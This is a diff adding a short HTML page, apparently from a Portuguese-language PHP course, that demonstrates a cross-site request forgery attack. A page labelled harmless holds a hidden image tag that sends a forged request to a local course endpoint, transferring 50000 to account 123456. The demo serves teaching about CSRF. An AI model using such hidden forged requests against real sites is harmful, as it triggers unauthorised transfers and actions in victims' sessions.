@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+
+<body>
+    <h1>Página Inofensiva</h1>
+    <p>Esta página parece inofensiva, mas na verdade está realizando um ataque CSRF.</p>
+
+    <!-- Código malicioso -->
+    <img src="http://127.0.0.1/curso-php/modulo3/formularios/csrf/transferir.php?conta_destino=123456&valor=50000"
+        style="display:none;">
+</body>
+
+</html>
